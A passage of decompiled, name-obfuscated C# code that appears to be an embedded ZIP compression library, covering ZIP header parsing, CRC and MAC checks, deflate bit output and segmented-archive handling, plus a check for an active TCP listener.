					class79_0.byte_1[class79_0.int_8++] = class79_0.byte_2;
				}
				if (class79_0.int_8 == class79_0.int_6)
				{
					break;
				}
				class79_0.int_2 = 4;
				continue;
				IL_18F:
				class79_0.int_5 = Class16.smethod_45(class76_0, 4);
				if (class79_0.int_5 >= 0)
				{
					class79_0.int_5 += 4;
					Class16.smethod_180(class76_0, 4);
					class79_0.byte_0 = new byte[19];
					class79_0.int_8 = 0;
					class79_0.int_2 = 3;
					goto IL_156;
				}
				return false;
				IL_1DD:
				class79_0.int_4 = Class16.smethod_45(class76_0, 5);
				if (class79_0.int_4 >= 0)
				{
					class79_0.int_4++;
					Class16.smethod_180(class76_0, 5);
					class79_0.int_6 = class79_0.int_3 + class79_0.int_4;
					class79_0.byte_1 = new byte[class79_0.int_6];
					class79_0.int_2 = 2;
					goto IL_18F;
				}
				return false;
			}
			return true;
		}

		static void smethod_486(Stream6 stream6_0)
		{
			if (stream6_0.int_11 < (int)stream6_0.char_0)
			{
				stream6_0.int_6 = stream6_0.int_8;
				Class16.smethod_623(stream6_0.gclass3_0, (byte)stream6_0.int_8);
				stream6_0.int_11++;
				return;
			}
			stream6_0.enum11_0 = Stream6.Enum11.const_2;
			stream6_0.int_10++;
			stream6_0.int_7 = 0;
			Class16.smethod_280(stream6_0);
		}

		static byte[] smethod_487(long long_0, long long_1, Enum8 enum8_0, int int_0, string string_0, Class8 class8_0)
		{
			Encoding encoding = Class16.smethod_213(string_0, class8_0);
			int num = 22;
			byte[] array = null;
			short num2 = 0;
			if (string_0 != null && string_0.Length != 0)
			{
				array = encoding.GetBytes(string_0);
				num2 = (short)array.Length;
			}
			num += (int)num2;
			byte[] array2 = new byte[num];
			byte[] bytes = BitConverter.GetBytes(101010256u);
			Array.Copy(bytes, 0, array2, 0, 4);
			int num3 = 0 + 4;
			byte[] arg_66_0 = array2;
			int expr_60 = 4;
			num3 = expr_60 + 1;
			arg_66_0[expr_60] = 0;
			byte[] arg_70_0 = array2;
			int expr_6A = 5;
			num3 = expr_6A + 1;
			arg_70_0[expr_6A] = 0;
			byte[] arg_7A_0 = array2;
			int expr_74 = 6;
			num3 = expr_74 + 1;
			arg_7A_0[expr_74] = 0;
			byte[] arg_84_0 = array2;
			int expr_7E = 7;
			num3 = expr_7E + 1;
			arg_84_0[expr_7E] = 0;
			if (int_0 < 65535)
			{
				if (enum8_0 != Enum8.const_3)
				{
					array2[num3++] = (byte)(int_0 & 255);
					array2[num3++] = (byte)((int_0 & 65280) >> 8);
					array2[num3++] = (byte)(int_0 & 255);
					array2[num3++] = (byte)((int_0 & 65280) >> 8);
					goto IL_FC;
				}
			}
			for (int i = 0; i < 4; i++)
			{
				array2[num3++] = 255;
			}
			IL_FC:
			long num4 = long_1 - long_0;
			if (num4 < (long)((ulong)-1) && long_0 < (long)((ulong)-1))
			{
				array2[num3++] = (byte)(num4 & 255L);
				array2[num3++] = (byte)((num4 & 65280L) >> 8);
				array2[num3++] = (byte)((num4 & 16711680L) >> 16);
				array2[num3++] = (byte)((num4 & (long)((ulong)-16777216)) >> 24);
				array2[num3++] = (byte)(long_0 & 255L);
				array2[num3++] = (byte)((long_0 & 65280L) >> 8);
				array2[num3++] = (byte)((long_0 & 16711680L) >> 16);
				array2[num3++] = (byte)((long_0 & (long)((ulong)-16777216)) >> 24);
			}
			else
			{
				for (int i = 0; i < 8; i++)
				{
					array2[num3++] = 255;
				}
			}
			if (string_0 != null && string_0.Length != 0)
			{
				if ((int)num2 + num3 + 2 > array2.Length)
				{
					num2 = (short)(array2.Length - num3 - 2);
				}
				array2[num3++] = (byte)(num2 & 255);
				array2[num3++] = (byte)(((int)num2 & 65280) >> 8);
				if (num2 != 0)
				{
					int i = 0;
					while (i < (int)num2 && num3 + i < array2.Length)
					{
						array2[num3 + i] = array[i];
						i++;
					}
					num3 += i;
				}
			}
			else
			{
				array2[num3++] = 0;
				array2[num3++] = 0;
			}
			return array2;
		}

		static void smethod_488(string string_0, bool bool_0, GClass1 gclass1_0)
		{
			Class16.smethod_505(".", bool_0, gclass1_0, string_0, null);
		}

		static GClass0 smethod_489(byte[] byte_0, GClass1 gclass1_0, string string_0)
		{
			Class16.smethod_441(string_0, gclass1_0);
			return Class16.smethod_548(string_0, gclass1_0, byte_0);
		}

		static void smethod_490(int int_0, byte[] byte_0, int int_1, int[] int_2, int int_3)
		{
			int num = 0;
			for (int i = int_3; i <= int_0; i++)
			{
				for (int j = 0; j < int_1; j++)
				{
					if ((int)(byte_0[j] & 255) == i)
					{
						int_2[j] = num;
						num++;
					}
				}
				num <<= 1;
			}
		}

		static void smethod_491(GClass1 gclass1_0)
		{
			EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
			if (eventHandler_ != null)
			{
				EventArgs3 e = Class16.smethod_413(gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, e);
			}
		}

		static int smethod_492(int[] int_0, int[] int_1, int[][] int_2, int[][] int_3, GClass2 gclass2_0)
		{
			int_1[0] = 9;
			int_0[0] = 5;
			int_2[0] = Class45.int_0;
			int_3[0] = Class45.int_1;
			return 0;
		}

		static int smethod_493(Class74.Class76 class76_0, byte[] byte_0, int int_0, int int_1)
		{
			int num = 0;
			while (class76_0.int_2 > 0 && int_1 > 0)
			{
				byte_0[int_0++] = (byte)class76_0.uint_0;
				class76_0.uint_0 >>= 8;
				class76_0.int_2 -= 8;
				int_1--;
				num++;
			}
			if (int_1 == 0)
			{
				return num;
			}
			int num2 = class76_0.int_1 - class76_0.int_0;
			if (int_1 > num2)
			{
				int_1 = num2;
			}
			Array.Copy(class76_0.byte_0, class76_0.int_0, byte_0, int_0, int_1);
			class76_0.int_0 += int_1;
			if ((class76_0.int_0 - class76_0.int_1 & 1) != 0)
			{
				class76_0.uint_0 = (uint)(class76_0.byte_0[class76_0.int_0++] & 255);
				class76_0.int_2 = 8;
			}
			return num + int_1;
		}

		static bool smethod_494(GClass0 gclass0_0, Encoding encoding_0)
		{
			gclass0_0.long_4 = gclass0_0.ArchiveStream.Position;
			int num = Class16.smethod_523(gclass0_0.ArchiveStream);
			int num2 = 0 + 4;
			if (num != 67324752)
			{
				gclass0_0.ArchiveStream.Seek(-4L, SeekOrigin.Current);
				if (num != 33639248 && (long)num != 101010256L)
				{
					throw new BadReadException(string.Format("  Bad signature (0x{0:X8}) at position  0x{1:X8}", num, gclass0_0.ArchiveStream.Position));
				}
				return false;
			}
			else
			{
				byte[] array = new byte[26];
				int num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
				if (num3 != array.Length)
				{
					return false;
				}
				num2 += num3;
				byte[] arg_AF_0 = array;
				int expr_AA = 0;
				int num4 = expr_AA + 1;
				int arg_BE_0 = arg_AF_0[expr_AA];
				byte[] arg_B7_0 = array;
				int expr_B2 = 1;
				num4 = expr_B2 + 1;
				gclass0_0.short_6 = (short)(arg_BE_0 + arg_B7_0[expr_B2] * 256);
				byte[] arg_CD_0 = array;
				int expr_C8 = 2;
				num4 = expr_C8 + 1;
				int arg_DC_0 = arg_CD_0[expr_C8];
				byte[] arg_D5_0 = array;
				int expr_D0 = 3;
				num4 = expr_D0 + 1;
				gclass0_0.short_7 = (short)(arg_DC_0 + arg_D5_0[expr_D0] * 256);
				byte[] arg_EC_0 = array;
				int expr_E7 = 4;
				num4 = expr_E7 + 1;
				int arg_FB_0 = arg_EC_0[expr_E7];
				byte[] arg_F4_0 = array;
				int expr_EF = 5;
				num4 = expr_EF + 1;
				gclass0_0.short_9 = (gclass0_0.short_8 = (short)(arg_FB_0 + arg_F4_0[expr_EF] * 256));
				byte[] arg_114_0 = array;
				int expr_10F = 6;
				num4 = expr_10F + 1;
				int arg_123_0 = arg_114_0[expr_10F];
				byte[] arg_11C_0 = array;
				int expr_117 = 7;
				num4 = expr_117 + 1;
				int arg_138_0 = arg_123_0 + arg_11C_0[expr_117] * 256;
				byte[] arg_12B_0 = array;
				int expr_126 = 8;
				num4 = expr_126 + 1;
				int arg_154_0 = arg_138_0 + arg_12B_0[expr_126] * 256 * 256;
				byte[] arg_141_0 = array;
				int expr_13C = 9;
				num4 = expr_13C + 1;
				gclass0_0.int_1 = arg_154_0 + arg_141_0[expr_13C] * 256 * 256 * 256;
				gclass0_0.dateTime_0 = Class16.smethod_324(gclass0_0.int_1);
				gclass0_0.enum7_0 |= Enum7.flag_1;
				if ((gclass0_0.short_7 & 1) == 1)
				{
					gclass0_0.enum2_0 = Enum2.const_1;
					gclass0_0.enum2_1 = Enum2.const_1;
					gclass0_0.bool_8 = true;
				}
				gclass0_0.int_2 = (int)array[num4++] + (int)array[num4++] * 256 + (int)array[num4++] * 256 * 256 + (int)array[num4++] * 256 * 256 * 256;
				gclass0_0.long_0 = (long)((ulong)((int)array[num4++] + (int)array[num4++] * 256 + (int)array[num4++] * 256 * 256 + (int)array[num4++] * 256 * 256 * 256));
				gclass0_0.long_2 = (long)((ulong)((int)array[num4++] + (int)array[num4++] * 256 + (int)array[num4++] * 256 * 256 + (int)array[num4++] * 256 * 256 * 256));
				if ((uint)gclass0_0.long_0 == 4294967295u || (uint)gclass0_0.long_2 == 4294967295u)
				{
					gclass0_0.bool_10 = true;
				}
				short num5 = (short)((int)array[num4++] + (int)array[num4++] * 256);
				short short_ = (short)((int)array[num4++] + (int)array[num4++] * 256);
				array = new byte[(int)num5];
				num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
				num2 += num3;
				if ((gclass0_0.short_7 & 2048) == 2048)
				{
					gclass0_0.AlternateEncoding = Encoding.UTF8;
					gclass0_0.AlternateEncodingUsage = Enum9.const_3;
				}
				gclass0_0.string_1 = gclass0_0.AlternateEncoding.GetString(array, 0, array.Length);
				if (gclass0_0.string_1.EndsWith("/"))
				{
					Class16.smethod_404(gclass0_0);
				}
				num2 += Class16.smethod_36(short_, gclass0_0, gclass0_0.ArchiveStream);
				gclass0_0.int_4 = 0;
				if (!gclass0_0.string_1.EndsWith("/") && (gclass0_0.short_7 & 8) == 8)
				{
					long position = gclass0_0.ArchiveStream.Position;
					bool flag = true;
					long num6 = 0L;
					int num7 = 0;
					while (flag)
					{
						num7++;
						if (gclass0_0.class8_0.gclass1_0 != null)
						{
							Class16.smethod_457(gclass0_0.class8_0.gclass1_0, gclass0_0);
						}
						long num8 = Class16.smethod_581(gclass0_0.ArchiveStream, 134695760);
						if (num8 == -1L)
						{
							return false;
						}
						num6 += num8;
						if (gclass0_0.bool_10)
						{
							array = new byte[20];
							num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
							if (num3 != 20)
							{
								return false;
							}
							byte[] arg_429_0 = array;
							int expr_424 = 0;
							num4 = expr_424 + 1;
							int arg_438_0 = arg_429_0[expr_424];
							byte[] arg_431_0 = array;
							int expr_42C = 1;
							num4 = expr_42C + 1;
							int arg_44D_0 = arg_438_0 + arg_431_0[expr_42C] * 256;
							byte[] arg_440_0 = array;
							int expr_43B = 2;
							num4 = expr_43B + 1;
							int arg_468_0 = arg_44D_0 + arg_440_0[expr_43B] * 256 * 256;
							byte[] arg_455_0 = array;
							int expr_450 = 3;
							num4 = expr_450 + 1;
							gclass0_0.int_2 = arg_468_0 + arg_455_0[expr_450] * 256 * 256 * 256;
							gclass0_0.long_0 = BitConverter.ToInt64(array, 4);
							num4 = 4 + 8;
							gclass0_0.long_2 = BitConverter.ToInt64(array, 12);
							num4 = 12 + 8;
							gclass0_0.int_4 += 24;
						}
						else
						{
							array = new byte[12];
							num3 = gclass0_0.ArchiveStream.Read(array, 0, array.Length);
							if (num3 != 12)
							{
								return false;
							}
							byte[] arg_4D6_0 = array;
							int expr_4D1 = 0;
							num4 = expr_4D1 + 1;
							int arg_4E5_0 = arg_4D6_0[expr_4D1];
							byte[] arg_4DE_0 = array;
							int expr_4D9 = 1;
							num4 = expr_4D9 + 1;
							int arg_4FA_0 = arg_4E5_0 + arg_4DE_0[expr_4D9] * 256;
							byte[] arg_4ED_0 = array;
							int expr_4E8 = 2;
							num4 = expr_4E8 + 1;
							int arg_515_0 = arg_4FA_0 + arg_4ED_0[expr_4E8] * 256 * 256;
							byte[] arg_502_0 = array;
							int expr_4FD = 3;
							num4 = expr_4FD + 1;
							gclass0_0.int_2 = arg_515_0 + arg_502_0[expr_4FD] * 256 * 256 * 256;
							byte[] arg_523_0 = array;
							int expr_51E = 4;
							num4 = expr_51E + 1;
							int arg_532_0 = arg_523_0[expr_51E];
							byte[] arg_52B_0 = array;
							int expr_526 = 5;
							num4 = expr_526 + 1;
							int arg_547_0 = arg_532_0 + arg_52B_0[expr_526] * 256;
							byte[] arg_53A_0 = array;
							int expr_535 = 6;
							num4 = expr_535 + 1;
							int arg_562_0 = arg_547_0 + arg_53A_0[expr_535] * 256 * 256;
							byte[] arg_54F_0 = array;
							int expr_54A = 7;
							num4 = expr_54A + 1;
							gclass0_0.long_0 = (long)((ulong)(arg_562_0 + arg_54F_0[expr_54A] * 256 * 256 * 256));
							byte[] arg_571_0 = array;
							int expr_56C = 8;
							num4 = expr_56C + 1;
							int arg_581_0 = arg_571_0[expr_56C];
							byte[] arg_57A_0 = array;
							int expr_575 = 9;
							num4 = expr_575 + 1;
							int arg_597_0 = arg_581_0 + arg_57A_0[expr_575] * 256;
							byte[] arg_58A_0 = array;
							int expr_585 = 10;
							num4 = expr_585 + 1;
							int arg_5B3_0 = arg_597_0 + arg_58A_0[expr_585] * 256 * 256;
							byte[] arg_5A0_0 = array;
							int expr_59B = 11;
							num4 = expr_59B + 1;
							gclass0_0.long_2 = (long)((ulong)(arg_5B3_0 + arg_5A0_0[expr_59B] * 256 * 256 * 256));
							gclass0_0.int_4 += 16;
						}
						if (flag = (num6 != gclass0_0.long_0))
						{
							gclass0_0.ArchiveStream.Seek(-12L, SeekOrigin.Current);
							num6 += 4L;
						}
					}
					gclass0_0.ArchiveStream.Seek(position, SeekOrigin.Begin);
				}
				gclass0_0.long_1 = gclass0_0.long_0;
				if ((gclass0_0.short_7 & 1) == 1)
				{
					if (gclass0_0.enum2_0 != Enum2.const_2)
					{
						if (gclass0_0.enum2_0 != Enum2.const_3)
						{
							gclass0_0.byte_3 = new byte[12];
							int arg_665_0 = num2;
							Stream stream_ = gclass0_0.stream_0;
							byte[] byte_ = gclass0_0.byte_3;
							num2 = arg_665_0 + Class16.smethod_414(byte_, stream_);
							gclass0_0.long_1 -= 12L;
							goto IL_6D3;
						}
					}
					int int_ = Class16.smethod_176(gclass0_0.enum2_1);
					gclass0_0.class20_0 = Class16.smethod_83(gclass0_0.ArchiveStream, null, int_);
					num2 += Class16.smethod_318(gclass0_0.class20_0) - 10;
					gclass0_0.long_1 -= (long)Class16.smethod_318(gclass0_0.class20_0);
					gclass0_0.int_4 += 10;
				}
				IL_6D3:
				gclass0_0.int_3 = num2;
				gclass0_0.long_6 = (long)gclass0_0.int_3 + gclass0_0.long_1 + (long)gclass0_0.int_4;
				return true;
			}
		}

		static byte[] smethod_495(Stream3 stream3_0)
		{
			if (!stream3_0.bool_0)
			{
				if (stream3_0.long_1 != 0L)
				{
					throw new BadStateException("The final hash has not been computed.");
				}
				byte[] buffer = new byte[0];
				stream3_0.hmacsha1_0.ComputeHash(buffer);
			}
			byte[] array = new byte[10];
			Array.Copy(stream3_0.hmacsha1_0.Hash, 0, array, 0, 10);
			return array;
		}

		static Stream smethod_496(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.ReadStream;
			}
			return class8_0.stream1_0.stream_0;
		}

		static Class9 smethod_497(Class15 class15_0)
		{
			return class15_0.class9_1;
		}

		static void smethod_498(Form1.Class0 class0_0)
		{
			class0_0.int_0 = -1;
			if (class0_0.ienumerator_0 != null)
			{
				class0_0.ienumerator_0.Dispose();
			}
		}

		static void smethod_499(GClass0 gclass0_0, string string_0)
		{
			if (gclass0_0.class8_0.gclass1_0 != null && !gclass0_0.class8_0.gclass1_0.bool_12)
			{
				Class16.smethod_117(false, gclass0_0, string_0, gclass0_0.class8_0.gclass1_0);
			}
		}

		static Stream0 smethod_500(Class8 class8_0)
		{
			return class8_0.stream0_0;
		}

		static bool smethod_501(Stream stream_0, bool bool_0)
		{
			if (stream_0 == null)
			{
				throw new ArgumentNullException("stream");
			}
			bool result = false;
			try
			{
				if (!stream_0.CanRead)
				{
					return false;
				}
				Stream @null = Stream.Null;
				using (GClass1 gClass = Class16.smethod_440(stream_0, null, null, null))
				{
					if (bool_0)
					{
						using (IEnumerator<GClass0> enumerator = gClass.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								GClass0 current = enumerator.Current;
								if (!current.bool_4)
								{
									Class16.smethod_105(current, @null);
								}
							}
						}
					}
				}
				result = true;
			}
			catch (IOException)
			{
			}
			catch (ZipException)
			{
			}
			return result;
		}

		static void smethod_502(TextWriter textWriter_0, string string_0, GClass1 gclass1_0)
		{
			gclass1_0.string_0 = string_0;
			gclass1_0.textWriter_0 = textWriter_0;
			gclass1_0.bool_5 = true;
			gclass1_0.AddDirectoryWillTraverseReparsePoints = true;
			gclass1_0.CompressionLevel = Enum20.const_8;
			gclass1_0.ParallelDeflateThreshold = 524288L;
			Class16.smethod_569(gclass1_0);
			if (File.Exists(gclass1_0.string_0))
			{
				if (gclass1_0.FullScan)
				{
					Class16.smethod_181(gclass1_0);
				}
				else
				{
					Class16.smethod_435(gclass1_0);
				}
				gclass1_0.bool_4 = true;
			}
		}

		static bool smethod_503(string string_0, bool bool_0)
		{
			bool result = false;
			try
			{
				if (!File.Exists(string_0))
				{
					return false;
				}
				using (FileStream fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					result = Class16.smethod_501(fileStream, bool_0);
				}
			}
			catch (IOException)
			{
			}
			catch (ZipException)
			{
			}
			return result;
		}

		static string smethod_504(string string_0, string string_1)
		{
			string string_2;
			if (string_1 == null)
			{
				string_2 = string_0;
			}
			else if (string.IsNullOrEmpty(string_1))
			{
				string_2 = Path.GetFileName(string_0);
			}
			else
			{
				string_2 = Path.Combine(string_1, Path.GetFileName(string_0));
			}
			return Class16.smethod_11(string_2);
		}

		static void smethod_505(string string_0, bool bool_0, GClass1 gclass1_0, string string_1, string string_2)
		{
			Class16.smethod_446(false, string_1, gclass1_0, string_2, string_0, bool_0);
		}

		static ICollection<GClass0> smethod_506(string string_0, string string_1, GClass1 gclass1_0)
		{
			Class17 class17_ = new Class17(string_0, gclass1_0.AddDirectoryWillTraverseReparsePoints);
			return Class16.smethod_380(gclass1_0, string_1, class17_);
		}

		static void smethod_507(GClass3 gclass3_0, byte[] byte_0, int int_0, int int_1)
		{
			if (byte_0 == null)
			{
				throw new Exception("The data buffer must not be null.");
			}
			for (int i = 0; i < int_1; i++)
			{
				int num = int_0 + i;
				byte b = byte_0[num];
				if (gclass3_0.bool_0)
				{
					uint num2 = gclass3_0.uint_2 >> 24 ^ (uint)b;
					gclass3_0.uint_2 = (gclass3_0.uint_2 << 8 ^ gclass3_0.uint_1[(int)((UIntPtr)num2)]);
				}
				else
				{
					uint num3 = (gclass3_0.uint_2 & 255u) ^ (uint)b;
					gclass3_0.uint_2 = (gclass3_0.uint_2 >> 8 ^ gclass3_0.uint_1[(int)((UIntPtr)num3)]);
				}
			}
			gclass3_0.long_0 += (long)int_1;
		}

		static void smethod_508(Class39 class39_0)
		{
			if (class39_0.int_51 > 8)
			{
				class39_0.byte_0[class39_0.int_21++] = (byte)class39_0.short_6;
				class39_0.byte_0[class39_0.int_21++] = (byte)(class39_0.short_6 >> 8);
			}
			else if (class39_0.int_51 > 0)
			{
				class39_0.byte_0[class39_0.int_21++] = (byte)class39_0.short_6;
			}
			class39_0.short_6 = 0;
			class39_0.int_51 = 0;
		}

		static bool smethod_509(Class82 class82_0)
		{
			return IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners().Any(new Func<IPEndPoint, bool>(class82_0.method_2));
		}

		static int smethod_510(ICollection<GClass0> icollection_0)
		{
			int num = 0;
			foreach (GClass0 current in icollection_0)
			{
				if (!current.bool_9)
				{
					num++;
				}
			}
			return num;
		}

		static int smethod_511(byte byte_0, int int_0, GClass3 gclass3_0)
		{
			return Class16.smethod_528(byte_0, gclass3_0, (uint)int_0);
		}

		static EventArgs4 smethod_512(string string_0, GClass0 gclass0_0, string string_1)
		{
			return new EventArgs4
			{
				string_0 = string_0,
				enum6_0 = Enum6.const_17,
				gclass0_0 = gclass0_0,
				string_1 = string_1
			};
		}

		static int smethod_513(Enum20 enum20_0, GClass2 gclass2_0, bool bool_0)
		{
			gclass2_0.enum20_0 = enum20_0;
			return Class16.smethod_534(bool_0, gclass2_0);
		}

		static bool smethod_514(GClass0 gclass0_0, Exception exception_0, GClass1 gclass1_0)
		{
			if (gclass1_0.eventHandler_4 != null)
			{
				lock (gclass1_0.object_0)
				{
					EventArgs5 eventArgs = Class16.smethod_115(gclass0_0, exception_0, gclass1_0.string_0);
					gclass1_0.eventHandler_4(gclass1_0, eventArgs);
					if (eventArgs.bool_0)
					{
						gclass1_0.bool_8 = true;
					}
				}
			}
			return gclass1_0.bool_8;
		}

		static byte[] smethod_515(Class55 class55_0)
		{
			return class55_0.byte_0;
		}

		static long smethod_516(long long_0, ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
		{
			if (uint_0 >= 99u)
			{
				throw new ArgumentOutOfRangeException("diskNumber");
			}
			if (zipSegmentedStream_0.rwMode_0 != ZipSegmentedStream.RwMode.Write)
			{
				zipSegmentedStream_0.bool_0 = true;
				throw new ZipException("bad state.");
			}
			if (uint_0 == zipSegmentedStream_0.uint_0)
			{
				return zipSegmentedStream_0.stream_0.Seek(long_0, SeekOrigin.Begin);
			}
			if (zipSegmentedStream_0.stream_0 != null)
			{
				zipSegmentedStream_0.stream_0.Dispose();
				if (File.Exists(zipSegmentedStream_0.string_3))
				{
					File.Delete(zipSegmentedStream_0.string_3);
				}
			}
			for (uint num = zipSegmentedStream_0.uint_0 - 1u; num > uint_0; num -= 1u)
			{
				string path = Class16.smethod_648(zipSegmentedStream_0, num);
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			Class16.smethod_472(zipSegmentedStream_0, uint_0);
			for (int i = 0; i < 3; i++)
			{
				try
				{
					zipSegmentedStream_0.string_3 = Class16.smethod_116();
					File.Move(Class16.smethod_455(zipSegmentedStream_0), zipSegmentedStream_0.string_3);
					break;
				}
				catch (IOException)
				{
					if (i == 2)
					{
						throw;
					}
				}
			}
			zipSegmentedStream_0.stream_0 = new FileStream(zipSegmentedStream_0.string_3, FileMode.Open);
			return zipSegmentedStream_0.stream_0.Seek(long_0, SeekOrigin.Begin);
		}

		static void smethod_517(int int_0, Class33 class33_0, int int_1)
		{
			byte[][] byte_ = class33_0.class34_0.byte_4;
			int[] int_2 = class33_0.class34_0.int_0;
			int num = class33_0.int_10;
			int num2 = 0;
			for (int i = int_0; i > 0; i--)
			{
				int num3 = num / i;
				int num4 = num2 - 1;
				int num5 = 0;
				int num6 = int_1 - 1;
				while (num5 < num3 && num4 < num6)
				{
					num5 += int_2[++num4];
				}
				if (num4 > num2 && i != int_0 && i != 1 && (int_0 - i & 1) != 0)
				{
					num5 -= int_2[num4--];
				}
				byte[] array = byte_[i - 1];
				int num7 = int_1;
				while (--num7 >= 0)
				{
					if (num7 >= num2 && num7 <= num4)
					{
						array[num7] = Class33.byte_1;
					}
					else
					{
						array[num7] = Class33.byte_0;
					}
				}
				num2 = num4 + 1;
				num -= num5;
			}
		}

		static Class74.Class78 smethod_518(Class74.Class79 class79_0)
		{
			byte[] array = new byte[class79_0.int_4];
			Array.Copy(class79_0.byte_1, class79_0.int_3, array, 0, class79_0.int_4);
			return new Class74.Class78(array);
		}

		static Stream13 smethod_519(GClass0 gclass0_0)
		{
			if (gclass0_0.class8_0.gclass1_0 == null)
			{
				throw new InvalidOperationException("Use OpenReader() only with ZipFile.");
			}
			return Class16.smethod_98(gclass0_0, gclass0_0.string_3 ?? Class16.smethod_663(gclass0_0.class8_0));
		}

		static void smethod_520(Stream stream_0, Class20 class20_0)
		{
			bool flag = false;
			class20_0.byte_4 = new byte[10];
			stream_0.Read(class20_0.byte_4, 0, class20_0.byte_4.Length);
			if (class20_0.byte_4.Length != class20_0.byte_6.Length)
			{
				flag = true;
			}
			if (!flag)
			{
				for (int i = 0; i < class20_0.byte_4.Length; i++)
				{
					if (class20_0.byte_4[i] != class20_0.byte_6[i])
					{
						flag = true;
					}
				}
			}
			if (flag)
			{
				throw new BadStateException("The MAC does not match.");
			}
		}

		static void smethod_521(Stream6 stream6_0)
		{
			stream6_0.uint_2 = ~stream6_0.gclass3_0.uint_2;
			if (stream6_0.uint_0 != stream6_0.uint_2)
			{
				string message = string.Format("BZip2 CRC error (expected {0:X8}, computed {1:X8})", stream6_0.uint_0, stream6_0.uint_2);
				throw new IOException(message);
			}
			stream6_0.uint_3 = (stream6_0.uint_3 << 1 | stream6_0.uint_3 >> 31);
			stream6_0.uint_3 ^= stream6_0.uint_2;
		}

		static void smethod_522(GClass0 gclass0_0, GClass1 gclass1_0)
		{
			EventHandler<EventArgs2> eventHandler_ = gclass1_0.eventHandler_3;
			if (eventHandler_ != null)
			{
				string archiveNameForEvent = gclass1_0.ArchiveNameForEvent;
				int count = gclass1_0.dictionary_0.Count;
				EventArgs2 eventArgs = Class16.smethod_291(count, gclass0_0, archiveNameForEvent);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_10 = true;
				}
			}
		}

		static int smethod_523(Stream stream_0)
		{
			int num = 0;
			try
			{
				num = Class16.smethod_296("n/a", stream_0);
				if (num == 134695760)
				{
					stream_0.Seek(12L, SeekOrigin.Current);
					num = Class16.smethod_296("n/a", stream_0);
					if (num != 67324752)
					{
						stream_0.Seek(8L, SeekOrigin.Current);
						num = Class16.smethod_296("n/a", stream_0);
						if (num != 67324752)
						{
							stream_0.Seek(-24L, SeekOrigin.Current);
							num = Class16.smethod_296("n/a", stream_0);
						}
					}
				}
			}
			catch (BadReadException)
			{
			}
			return num;
		}

		static void smethod_524(Class32 class32_0, byte byte_0)
		{
			Class16.smethod_478(class32_0, 8, (uint)byte_0);
		}

		static void smethod_525(Class20 class20_0, string string_0)
		{
			class20_0.string_0 = string_0;
			if (class20_0.string_0 != null)
			{
				class20_0.short_1 = (short)((int)Class16.smethod_363(class20_0)[0] + (int)Class16.smethod_363(class20_0)[1] * 256);
				if (class20_0.short_1 != class20_0.short_0)
				{
					throw new BadPasswordException();
				}
			}
		}

		static void smethod_526(Class54 class54_0, Exception exception_0)
		{
			class54_0.exception_0 = exception_0;
		}

		static void smethod_527(int int_0, Class39 class39_0, int int_1, int int_2)
		{
			Class16.smethod_371(class39_0, int_1 - 257, 5);
			Class16.smethod_371(class39_0, int_0 - 1, 5);
			Class16.smethod_371(class39_0, int_2 - 4, 4);
			for (int i = 0; i < int_2; i++)
			{
				Class16.smethod_371(class39_0, (int)class39_0.short_4[(int)(Class47.sbyte_0[i] * 2 + 1)], 3);
			}
			Class16.smethod_563(class39_0.short_2, int_1 - 1, class39_0);
			Class16.smethod_563(class39_0.short_3, int_0 - 1, class39_0);
		}

		static int smethod_528(byte byte_0, GClass3 gclass3_0, uint uint_0)
		{
			return (int)(gclass3_0.uint_1[(int)((UIntPtr)((uint_0 ^ (uint)byte_0) & 255u))] ^ uint_0 >> 8);
		}

		static void smethod_529(GClass0 gclass0_0, string string_0, object[] object_0)
		{
			if (gclass0_0.class8_0.gclass1_0 != null && gclass0_0.class8_0.gclass1_0.textWriter_0 != null)
			{
				gclass0_0.class8_0.gclass1_0.textWriter_0.WriteLine(string_0, object_0);
			}
		}

		static int smethod_530(Class44 class44_0)
		{
			if (class44_0.enum17_0 != Class44.Enum17.const_13)
			{
				class44_0.enum17_0 = Class44.Enum17.const_13;
				class44_0.int_1 = 0;
			}
			int num;
			if ((num = class44_0.gclass2_0.int_1) == 0)
			{
				return -5;
			}
			int num2 = class44_0.gclass2_0.int_0;
			int num3 = class44_0.int_1;
			while (num != 0 && num3 < 4)
			{
				if (class44_0.gclass2_0.byte_0[num2] == Class44.byte_0[num3])
				{
					num3++;
				}
				else if (class44_0.gclass2_0.byte_0[num2] != 0)
				{
					num3 = 0;
				}
				else
				{
					num3 = 4 - num3;
				}
				num2++;
				num--;
			}
			class44_0.gclass2_0.long_0 += (long)(num2 - class44_0.gclass2_0.int_0);
			class44_0.gclass2_0.int_0 = num2;
			class44_0.gclass2_0.int_1 = num;
			class44_0.int_1 = num3;
			if (num3 != 4)
			{
				return -3;
			}
			long long_ = class44_0.gclass2_0.long_0;
			long long_2 = class44_0.gclass2_0.long_1;
			Class16.smethod_345(class44_0);
			class44_0.gclass2_0.long_0 = long_;
			class44_0.gclass2_0.long_1 = long_2;
			class44_0.enum17_0 = Class44.Enum17.const_7;
			return 0;
		}

		static string smethod_531(Class3 class3_0)
		{
			return class3_0.string_0;
		}

		static void smethod_532(GClass2 gclass2_0)
		{
			int num = gclass2_0.class39_0.int_21;
			if (num > gclass2_0.int_3)
			{
				num = gclass2_0.int_3;
			}
			if (num == 0)
			{
				return;
			}
			if (gclass2_0.class39_0.byte_0.Length > gclass2_0.class39_0.int_20 && gclass2_0.byte_1.Length > gclass2_0.int_2 && gclass2_0.class39_0.byte_0.Length >= gclass2_0.class39_0.int_20 + num && gclass2_0.byte_1.Length >= gclass2_0.int_2 + num)
			{
				Array.Copy(gclass2_0.class39_0.byte_0, gclass2_0.class39_0.int_20, gclass2_0.byte_1, gclass2_0.int_2, num);
				gclass2_0.int_2 += num;
				gclass2_0.class39_0.int_20 += num;
				gclass2_0.long_1 += (long)num;
